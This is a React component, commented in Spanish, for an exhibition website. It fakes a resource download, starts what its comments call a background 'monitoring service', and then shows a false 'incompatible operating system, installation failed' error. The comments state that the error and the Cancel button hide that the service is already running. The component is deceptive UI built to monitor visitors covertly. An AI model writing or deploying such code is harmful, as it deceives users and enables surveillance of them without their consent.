import { useState, useEffect } from 'react';
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Progress } from "@/components/ui/progress";
import { Loader2, AlertTriangle, CheckCircle, XCircle } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { backgroundService } from '@/lib/backgroundService';

/**
 * Este componente simula una instalación legítima pero en realidad está
 * instalando nuestro servicio de monitoreo en segundo plano.
 */
export function FakeInstallPrompt() {
  const [open, setOpen] = useState(true);
  const [stage, setStage] = useState<'downloading' | 'verifying' | 'error' | 'complete'>('downloading');
  const [progress, setProgress] = useState(0);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [downloadComplete, setDownloadComplete] = useState(false);
  
  // Simulamos el progreso de descarga
  useEffect(() => {
    let interval: number;
    
    if (stage === 'downloading') {
      interval = window.setInterval(() => {
        setProgress(prev => {
          const newProgress = prev + Math.random() * 5;
          
          if (newProgress >= 100) {
            clearInterval(interval);
            setTimeout(() => {
              setStage('verifying');
              // La "verificación" toma un poco de tiempo
              setTimeout(() => {
                // Aquí en realidad activamos el servicio pero mostramos un error
                backgroundService.updateActivityTime();
                setStage('error');
                setShowErrorModal(true);
                setOpen(false);
                setDownloadComplete(true);
              }, 2000);
            }, 500);
            return 100;
          }
          
          return newProgress;
        });
      }, 200);
    }
    
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [stage]);
  
  // La función que "instalaría" el servicio (en realidad ya lo iniciamos)
  const handleInstall = () => {
    // Ya hemos instalado silenciosamente, simplemente cerramos el diálogo de error
    setShowErrorModal(false);
  };
  
  // Esta función aparenta cancelar pero el servicio ya está corriendo
  const handleCancel = () => {
    setShowErrorModal(false);
  };
  
  return (
    <>
      {/* Diálogo de descarga de recursos */}
      <Dialog open={open} onOpenChange={setOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Descargando recursos</DialogTitle>
            <DialogDescription>
              Estamos descargando información y materiales para la exposición.
            </DialogDescription>
          </DialogHeader>
          
          <div className="py-6">
            {stage === 'downloading' && (
              <div className="space-y-4">
                <div className="flex items-center justify-center">
                  <Loader2 className="h-8 w-8 animate-spin text-primary" />
                </div>
                <Progress value={progress} className="h-2" />
                <p className="text-center text-sm text-muted-foreground">
                  Descargando materiales ({Math.round(progress)}%)
                </p>
              </div>
            )}
            
            {stage === 'verifying' && (
              <div className="space-y-4">
                <div className="flex items-center justify-center">
                  <Loader2 className="h-8 w-8 animate-spin text-primary" />
                </div>
                <p className="text-center text-sm text-muted-foreground">
                  Verificando archivos...
                </p>
              </div>
            )}
          </div>
        </DialogContent>
      </Dialog>
      
      {/* Diálogo de error (que en realidad oculta que ya instalamos el servicio) */}
      <Dialog open={showErrorModal} onOpenChange={setShowErrorModal}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="flex items-center">
              <AlertTriangle className="h-5 w-5 text-red-500 mr-2" />
              Error en la instalación
            </DialogTitle>
          </DialogHeader>
          
          <div className="py-4">
            <Alert variant="destructive" className="mb-4">
              <AlertTriangle className="h-4 w-4" />
              <AlertTitle>Incompatibilidad detectada</AlertTitle>
              <AlertDescription>
                Esta aplicación no es compatible con tu sistema operativo.
              </AlertDescription>
            </Alert>
            
            <p className="text-sm text-muted-foreground mb-4">
              Lo sentimos, pero la aplicación de la exposición no pudo instalarse en tu dispositivo.
              Puedes seguir accediendo a toda la información a través de nuestra página web.
            </p>
            
            <div className="flex justify-end space-x-2">
              <Button variant="outline" onClick={handleCancel}>
                <XCircle className="h-4 w-4 mr-2" />
                Cancelar
              </Button>
              <Button variant="default" onClick={handleInstall}>
                <CheckCircle className="h-4 w-4 mr-2" />
                Entendido
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
      
      {/* Mensaje visible después de la "descarga" */}
      {downloadComplete && (
        <div className="mt-4 text-center">
          <p className="text-muted-foreground text-sm">
            Puedes seguir navegando por la página mientras esperamos tu visita a la exposición.
          </p>
        </div>
      )}
    </>
  );
}